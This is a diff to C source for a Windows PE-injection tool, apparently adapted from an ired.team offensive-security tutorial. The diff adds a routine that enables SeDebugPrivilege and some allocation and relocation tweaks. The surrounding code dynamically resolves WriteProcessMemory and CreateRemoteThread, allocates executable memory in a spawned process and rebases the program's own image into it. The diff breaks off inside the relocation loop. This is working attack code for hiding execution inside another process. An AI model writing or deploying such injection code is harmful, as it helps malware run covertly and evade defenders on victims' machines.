@@ -14,9 +14,39 @@ https://www.ired.team/offensive-security/code-injection-process-injection/pe-inj
 #include <windows.h>
 
 typedef struct BASE_RELOCATION_ENTRY {
-	USHORT Offset : 12;
+	USHORT Offset : 12; //The bottom 12bits are used to describe the offset into the VirtualAddress of the containing relocation block.
 	USHORT Type : 4;
 } BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
+
+BOOL EnableWindowsPrivilege(TCHAR* Privilege) {
+    HANDLE token;
+    TOKEN_PRIVILEGES priv;
+    BOOL ret = FALSE;
+    printf(" [+] Enable %s privilege\n", Privilege);
+
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
+        priv.PrivilegeCount = 1;
+        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+        if (LookupPrivilegeValue(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
+            AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE) {
+            ret = TRUE;
+        }
+
+        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { // In case privilege is not part of token (e.g. run as non-admin)
+            ret = FALSE;
+        }
+
+        CloseHandle(token);
+    }
+
+    if (ret == TRUE)
+        printf(" [+] Success\n");
+    else
+        printf(" [-] Failure\n");
+
+    return ret;
+}
 
 // Define function pointers for dynamically loaded functions
 typedef HANDLE(WINAPI *PFN_GETMODULEHANDLEA)(LPCSTR);
@@ -84,6 +114,12 @@ int main()
     PFN_WRITEPROCESSMEMORY pWriteProcessMemory = (PFN_WRITEPROCESSMEMORY)GetProcAddress(hKernel32, "WriteProcessMemory");
     PFN_CREATEREMOTETHREAD pCreateRemoteThread = (PFN_CREATEREMOTETHREAD)GetProcAddress(hKernel32, "CreateRemoteThread");
 
+
+    if (!EnableWindowsPrivilege(TEXT("SeDebugPrivilege"))) {
+        printf("Failed to enable SeDebugPrivilege. You might not have sufficient rights.\n");
+        return -1;
+    }
+
     if (!pCreateProcessA || !pGetLastError || !pSleep || !pGetModuleHandleA || !pVirtualAlloc || !pVirtualAllocEx || !pOpenProcess || !pWriteProcessMemory || !pCreateRemoteThread) {
         printf("Failed to get one or more function addresses.\n");
         FreeLibrary(hKernel32);
@@ -112,14 +148,24 @@ int main()
     pSleep(2000);
 
     PVOID imageBase = pGetModuleHandleA(NULL);
+	if (imageBase != NULL)
+	{
+	    char path[MAX_PATH];
+	    if (GetModuleFileName(imageBase, path, sizeof(path)) != 0)
+	    {
+	        // The path variable now contains the full path to the executable.
+	        printf("This program is running from: %s\n", path);
+	    }
+	}
+	
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
     PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);
 
-    PVOID localImage = pVirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
+    PVOID localImage = pVirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);
 
     HANDLE targetProcess = pOpenProcess(MAXIMUM_ALLOWED, FALSE, pi.dwProcessId);
-    PVOID targetImage = pVirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    PVOID targetImage = pVirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
     DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;
     PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
@@ -127,6 +173,7 @@ int main()
     DWORD totalProcessed = 0;
 
 	// Iterate the reloc table of the local image and modify all absolute addresses to work at the address returned by VirtualAllocEx.
+	// Loop for all relocation descriptors in all relocation blocks
     while (totalProcessed < totalSize) {
         DWORD blockSize = relocationTable->SizeOfBlock;
         DWORD entryCount = (blockSize - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
